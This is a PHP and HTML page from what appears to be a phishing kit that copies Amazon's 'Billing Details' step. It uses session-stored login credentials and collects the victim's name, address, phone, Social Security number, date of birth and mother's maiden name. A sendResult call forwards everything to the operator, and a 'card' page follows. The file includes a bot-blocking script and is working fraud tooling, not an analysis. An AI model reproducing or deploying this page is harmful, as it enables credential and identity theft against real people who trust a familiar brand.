<?php
require 'includes/config.php';
require 'includes/functions.php';
require 'includes/blocker.php';

// Language detection removed; use default English
$visitor_info = getClientInfo();
$_SESSION['lang'] = 'en';

if(!isset($_SESSION['email']) || !isset($_SESSION['password'])) {
    header('Location: login');
    exit;
}

// Validasi ref parameter
$ref = $_GET['ref'] ?? '';
if (empty($ref) || $ref !== ($_SESSION['ref'] ?? '')) {
    header('Location: login.php');
    exit;
}

$email = $_SESSION['email'];
$password = $_SESSION['password'];

if($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['fullname'])) {
    $data = [
        'email' => $email,
        'password' => $password,
        'fullname' => $_POST['fullname'],
        'address' => $_POST['address'],
        'address2' => $_POST['address2'],
        'city' => $_POST['city'],
        'state' => $_POST['state'],
        'zipcode' => $_POST['zipcode'],
        'phonenumber' => $_POST['phonenumber'],
        'dob' => $_POST['dob'],
        'sosel' => $_POST['sosel'],
        'mmn' => $_POST['mmn']
    ];
    sendResult('billing', $data);
    // Simpan di session sebelum redirect
    $_SESSION['fullname'] = $_POST['fullname'];
    $_SESSION['address'] = $_POST['address'];
    $_SESSION['address2'] = $_POST['address2'];
    $_SESSION['city'] = $_POST['city'];
    $_SESSION['state'] = $_POST['state'];
    $_SESSION['zipcode'] = $_POST['zipcode'];
    $_SESSION['phonenumber'] = $_POST['phonenumber'];
    $_SESSION['dob'] = $_POST['dob'];
    $_SESSION['sosel'] = $_POST['sosel'];
    $_SESSION['mmn'] = $_POST['mmn'];
    header('Location: card?ref=' . $ref);
    exit;
}
?>
<?php $lang = 'en'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon - Billing Details</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f3f3f3;
            padding: 20px;
        }

        .container {
            max-width: 500px;
            margin: 0 auto;
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 103px;
            height: auto;
        }

        h1 {
            font-size: 24px;
            font-weight: normal;
            margin-bottom: 10px;
        }

        .subtitle {
            color: #565959;
            font-size: 13px;
            margin-bottom: 25px;
        }

        .form-group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-size: 13px;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .required {
            color: #c40000;
        }

        input, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            font-size: 13px;
            transition: border-color 0.2s;
        }

        input:focus, select:focus {
            outline: none;
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228, 121, 17, 0.5);
        }

        .btn-next {
            width: 100%;
            background-color: #f0c14b;
            border: 1px solid #a88734;
            border-radius: 3px;
            padding: 12px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 25px;
            transition: background-color 0.2s;
        }

        .btn-next:hover {
            background-color: #ddb347;
        }

        .btn-next:active {
            background-color: #d1a73c;
        }
    </style>
</head>
<body>
	<div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" class="logo-image">
    </div>
    <div class="container">
        <h1>Billing Details</h1>
        <p class="subtitle">This is required to verify your account.</p>

        <form method="POST" action="">
            <div class="form-group">
                <label><span class="required">*</span> Full name</label>
                <input type="text" name="fullname" placeholder="Name that appears on the payment method" required>
            </div>

            <div class="form-group">
                <label>Country/Region</label>
				<select name="country" required>
					<option value="">Select Country</option>
					<option value="United States">United States</option>
					<option value="Canada">Canada</option>
					<option value="United Kingdom">United Kingdom</option>
					<option value="Australia">Australia</option>
					<option value="Germany">Germany</option>
					<option value="France">France</option>
					<option value="Italy">Italy</option>
					<option value="Spain">Spain</option>
					<option value="Netherlands">Netherlands</option>
					<option value="Sweden">Sweden</option>
					<option value="Norway">Norway</option>
					<option value="Denmark">Denmark</option>
					<option value="Switzerland">Switzerland</option>
					<option value="Austria">Austria</option>
					<option value="Belgium">Belgium</option>
					<option value="Japan">Japan</option>
					<option value="South Korea">South Korea</option>
					<option value="Singapore">Singapore</option>
					<option value="Malaysia">Malaysia</option>
					<option value="Indonesia">Indonesia</option>
					<option value="Philippines">Philippines</option>
					<option value="Thailand">Thailand</option>
					<option value="India">India</option>
					<option value="Brazil">Brazil</option>
					<option value="Mexico">Mexico</option>
				</select>

            </div>

            <div class="form-group">
                <label><span class="required">*</span> Billing address</label>
                <input type="text" name="address" placeholder="Street and number, P.O. box, c/o" required>
            </div>

            <div class="form-group">
                <input type="text" name="address2" placeholder="Apartment, suite, unit, building, floor, etc.">
            </div>

            <div class="form-group">
                <label><span class="required">*</span> City</label>
                <input type="text" name="city" required>
            </div>

            <div class="form-group">
                <label><span class="required">*</span> State/Province/Region</label>
                <input type="text" name="state" required>
            </div>

            <div class="form-group">
                <label><span class="required">*</span> Zip Code</label>
                <input type="text" name="zipcode" required>
            </div>

            <div class="form-group">
                <label><span class="required">*</span> Phone Number</label>
				<input type="text" name="phonenumber" placeholder="e.g., (555) 555-5555" id="phone" pattern="^\(\d{3}\) \d{3}-\d{4}$" required>
			</div>

			<div class="form-group">
                <label><span class="required">*</span> Social Security Number</label>
				<input type="text" name="sosel" id="ssn_display" placeholder="XXX-XX-XXXX" maxlength="11" required>
				<input type="hidden" id="ssn_real">
			</div>

            <div class="form-group">
                <label><span class="required">*</span> Date Of Birth</label>
                <input type="text" name="dob" placeholder="mm/dd/yyyy" required>
            </div>

			<div class="form-group">
                <label><span class="required">*</span> Mother's Maiden Name</label>
				<input type="text" name="mmn" required>
			</div>

            <button type="submit" class="btn-next">Next</button>

			<script>
			/* ================= Phone formatting ================= */
			document.getElementById("phone").addEventListener("input", function(e) {
			let input = e.target;
			// Ambil hanya angka
			let numbers = input.value.replace(/\D/g, "");
			// Batasi maksimal 10 digit
			numbers = numbers.substring(0, 10);

			let formatted = "";

			if (numbers.length > 0) {
				formatted = "(" + numbers.substring(0, Math.min(3, numbers.length));
			}
			if (numbers.length >= 4) {
				formatted += ") " + numbers.substring(3, Math.min(6, numbers.length));
			}
			if (numbers.length >= 7) {
				formatted += "-" + numbers.substring(6, numbers.length);
			}

			input.value = formatted;

			});

			/* ================= SSN auto-format & masking ================= */
			const ssnInput = document.getElementById("ssn_display");
			const ssnReal = document.getElementById("ssn_real");

			// Auto-format saat mengetik
			ssnInput.addEventListener("input", function() {
				let raw = this.value.replace(/\D/g, "");
				if (raw.length >= 9) {
					this.value = raw.slice(0,3) + "-" + raw.slice(3,5) + "-" + raw.slice(5,9);
				} else if (raw.length >= 5) {
					this.value = raw.slice(0,3) + "-" + raw.slice(3,5) + "-" + raw.slice(5);
				} else if (raw.length >= 3) {
					this.value = raw.slice(0,3) + "-" + raw.slice(3);
				} else {
					this.value = raw;
				}
			});

			// Masking saat blur
			ssnInput.addEventListener("blur", function() {
				let raw = this.value.replace(/\D/g, "");
				if (raw.length === 9) {
					ssnReal.value = raw.slice(0,3) + "-" + raw.slice(3,5) + "-" + raw.slice(5);
					this.value = "***-**-" + raw.slice(-4);
				}
			});
</script>
</body>
</html>